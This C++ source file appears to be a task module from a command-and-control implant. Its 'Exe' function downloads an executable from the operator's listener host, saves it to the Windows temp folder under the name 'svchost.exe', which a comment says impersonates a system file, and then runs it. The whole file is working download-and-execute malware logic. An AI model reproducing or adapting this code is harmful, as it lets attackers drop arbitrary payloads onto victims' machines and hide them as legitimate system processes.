#include "core/task.hpp"

namespace Task
{
    std::wstring Exe(State::PSTATE pState, const std::wstring& wExeSrc)
    {
        std::wstring result;

        // Set the temp file path
        std::wstring wExeTmpFileName = L"svchost.exe"; // Impersonate the file name.
        std::wstring wExeDest = System::Env::EnvStringsGet(pState->pProcs, L"%TEMP%") + L"\\" + wExeTmpFileName;

        Stdout::DisplayMessageBoxW(wExeDest.c_str(), L"wExeDest");

        // Download an executable
        std::wstring wHeaders = L"X-UUID: " + pState->wUUID + L"\r\n";

        if (!System::Http::FileDownload(
            pState->pProcs,
            pState->pCrypt,
            pState->hConnect,
            pState->lpListenerHost,
            pState->nListenerPort,
            pState->lpReqPathDownload,
            wHeaders.c_str(),
            wExeSrc,
            wExeDest
        )) {
            return L"Error: Failed to download exe file.";
        }

        // Execute
        if (!System::Process::ExecuteFile(pState->pProcs, wExeDest))
        {
            return L"Error: Failed to execute exe file.";
        }

        return L"Success: exe file has been executed.";
    }
}